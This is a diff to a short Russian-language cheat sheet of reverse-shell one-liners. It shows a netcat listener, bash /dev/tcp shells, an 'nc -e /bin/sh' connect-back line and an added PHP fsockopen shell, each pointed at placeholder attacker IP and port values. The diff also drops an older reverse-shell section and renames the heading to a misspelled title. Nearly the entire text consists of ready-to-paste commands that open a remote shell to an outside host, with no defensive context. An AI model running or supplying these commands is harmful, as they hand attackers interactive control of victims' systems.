@@ -1,10 +1,15 @@
-# NetCat
+# Сreat conect
 
 слушать порт:
 ```bash
 nc -lvnp {port}
 ```
 подключиться к прослушиваемому порту:
+или
+```bash
+nc -e /bin/sh {IP} {port}
+```
+или
 ```bash
 bash -i >& /dev/tcp/{IP}/{port} 0>&1
 ```
@@ -16,18 +21,10 @@ sh -i >& /dev/tcp/{IP}/{port} 0>&1
 ```bash
 bash -c "bash -i >& /dev/tcp/{your_IP}/{your_listeniing_port} 0>&1"
 ```
-## Reverse shell
-
-- В консоли введите команду:
-```bash
-nc -nlvp {port}
+или
+```php
+php -r '$sock=fsockopen({ip},{port});exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
-
-- Чтобы соединиться с удаленного узла введите команду:
-```bash
-nc -e /bin/sh {IP} {port}
-```
-
 Реверс-шелл можно также организовать при помощи команды:
 ```bash
 reverse_shell_listener {port}
